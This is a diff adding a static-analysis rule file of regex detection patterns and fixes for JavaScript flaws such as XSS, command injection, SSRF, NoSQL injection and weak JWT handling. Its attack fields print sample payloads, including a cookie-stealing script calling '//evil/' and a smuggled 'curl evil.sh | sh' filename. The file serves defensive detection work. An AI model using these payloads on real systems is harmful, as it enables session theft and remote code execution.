@@ -1,0 +1,125 @@
+# ThreadAI rules — JavaScript / TypeScript / web. Schema: see core.toml.
+
+[[rule]]
+id = "TAI-JS-001"
+title = "Untrusted HTML written to the DOM (innerHTML / document.write)"
+severity = "high"
+cwe = "CWE-79"
+owasp = "A03:2021"
+languages = ["javascript"]
+pattern = '''(\.(innerHTML|outerHTML)\s*\+?=|\bdocument\.write(ln)?\s*\(|\.insertAdjacentHTML\s*\()'''
+exclude = '''(\.(innerHTML|outerHTML)\s*=\s*(['"][^'"]*['"]|`[^`$]*`)\s*;?\s*$|DOMPurify\.sanitize)'''
+attack = "Input like <img src=x onerror=fetch('//evil/'+document.cookie)> runs script in the victim's session (stored/DOM XSS)."
+fix = "Use textContent / innerText for text, build nodes with createElement, or sanitize with DOMPurify.sanitize() first."
+
+[[rule]]
+id = "TAI-JS-002"
+title = "React dangerouslySetInnerHTML without sanitization"
+severity = "medium"
+cwe = "CWE-79"
+owasp = "A03:2021"
+languages = ["javascript"]
+pattern = '''dangerouslySetInnerHTML'''
+exclude = '''(?i)(DOMPurify|sanitize)'''
+attack = "Bypasses React's automatic escaping; any user-controlled HTML becomes XSS."
+fix = "Render as text, or wrap the value: {{ __html: DOMPurify.sanitize(html) }}."
+
+[[rule]]
+id = "TAI-JS-003"
+title = "Shell command built from dynamic input (child_process.exec)"
+severity = "high"
+cwe = "CWE-78"
+owasp = "A03:2021"
+languages = ["javascript"]
+pattern = '''((^|[^.\w])(exec|execSync)\s*\(\s*(`[^`]*\$\{|['"][^'"]*['"]\s*\+|[A-Za-z_$][\w.$]*\s*[,)])|child_process\.(exec|execSync)\s*\()'''
+attack = "A filename like `x; curl evil.sh | sh` is executed by the shell — full remote code execution."
+fix = "Use execFile/spawn with an argument array (no shell), and validate input against an allowlist."
+
+[[rule]]
+id = "TAI-JS-004"
+title = "Dynamic code via new Function / string setTimeout"
+severity = "high"
+cwe = "CWE-95"
+owasp = "A03:2021"
+languages = ["javascript"]
+pattern = '''(\bnew\s+Function\s*\(|\bset(Timeout|Interval)\s*\(\s*['"`])'''
+attack = "Equivalent to eval: attacker-influenced strings become executable code."
+fix = "Pass a real function to setTimeout; replace new Function with explicit logic or a lookup table."
+
+[[rule]]
+id = "TAI-JS-005"
+title = "JWT decoded without verification or 'none' algorithm allowed"
+severity = "high"
+cwe = "CWE-347"
+owasp = "A07:2021"
+languages = ["javascript"]
+pattern = '''(?i)(\bjwt\.decode\s*\(|algorithms?\s*:\s*\[?\s*['"]none['"])'''
+attack = "jwt.decode does not check the signature; an attacker forges {\"role\":\"admin\"} and is trusted."
+fix = "Use jwt.verify(token, key, { algorithms: ['HS256'] }) (or your exact algorithm) and reject 'none'."
+
+[[rule]]
+id = "TAI-JS-006"
+title = "Permissive CORS (wildcard or reflected origin)"
+severity = "medium"
+cwe = "CWE-942"
+owasp = "A05:2021"
+languages = ["javascript"]
+pattern = '''(?i)(Access-Control-Allow-Origin['"]?\s*[,:]\s*['"]\*['"]|\borigin\s*:\s*(['"]\*['"]|true\b))'''
+attack = "Any website can make authenticated cross-origin requests and read the responses — data theft from logged-in users."
+fix = "Set origin to an explicit allowlist: cors({ origin: ['https://app.example.com'], credentials: true })."
+
+[[rule]]
+id = "TAI-JS-007"
+title = "Math.random() used for a security value"
+severity = "medium"
+cwe = "CWE-338"
+owasp = "A02:2021"
+languages = ["javascript"]
+pattern = '''(?i)((token|secret|password|key|nonce|salt|otp|session|csrf).*Math\.random\(|Math\.random\(.*(token|secret|password|key|nonce|salt|otp|session|csrf))'''
+attack = "Math.random is predictable; observing a few outputs lets an attacker predict reset tokens or session IDs."
+fix = "Use crypto.randomBytes(32).toString('hex') (Node) or crypto.getRandomValues / crypto.randomUUID (browser)."
+
+[[rule]]
+id = "TAI-JS-008"
+title = "Open redirect from request data"
+severity = "medium"
+cwe = "CWE-601"
+owasp = "A01:2021"
+languages = ["javascript"]
+pattern = '''\b(res|reply|ctx)\.redirect\s*\(\s*(\d+\s*,\s*)?req(uest)?\.(query|body|params)'''
+attack = "https://yoursite/login?next=https://evil.example sends victims to a phishing page under your trusted domain."
+fix = "Only redirect to relative paths or an allowlist of hosts; reject absolute URLs from input."
+
+[[rule]]
+id = "TAI-JS-009"
+title = "Server-side request to a user-controlled URL (SSRF)"
+severity = "high"
+cwe = "CWE-918"
+owasp = "A10:2021"
+languages = ["javascript"]
+pattern = '''\b(fetch|axios(\.(get|post|put|patch|delete|request))?|got|request|http\.get|https\.get)\s*\(\s*(`[^`]*\$\{\s*)?req(uest)?\.(query|body|params)'''
+attack = "Attacker points the server at http://169.254.169.254/ (cloud metadata) or internal admin services and reads the response."
+fix = "Allowlist destination hosts, resolve and block private/link-local IPs, and disable redirects for user-supplied URLs."
+
+[[rule]]
+id = "TAI-JS-010"
+title = "NoSQL query built directly from request body/query"
+severity = "high"
+cwe = "CWE-943"
+owasp = "A03:2021"
+languages = ["javascript"]
+pattern = '''\.(find|findOne|findOneAndUpdate|updateOne|deleteOne|deleteMany|where|countDocuments)\s*\(\s*req(uest)?\.(body|query|params)\b'''
+attack = "Sending {\"password\": {\"$ne\": null}} matches any user — login bypass and data dumps."
+fix = "Pick individual fields, cast them to strings/numbers, and use a schema validator (zod, joi) or mongo-sanitize."
+
+[[rule]]
+id = "TAI-JS-011"
+title = "JWT signed with a hardcoded secret"
+severity = "high"
+cwe = "CWE-798"
+owasp = "A07:2021"
+languages = ["javascript"]
+pattern = '''\bjwt\.(sign|verify)\s*\([^,]+,\s*['"][^'"]+['"]'''
+redact = true
+attack = "Anyone who reads the source can mint valid tokens for any user, including admins."
+fix = "Load the signing key from process.env (and fail to start if it is missing); rotate the leaked one."
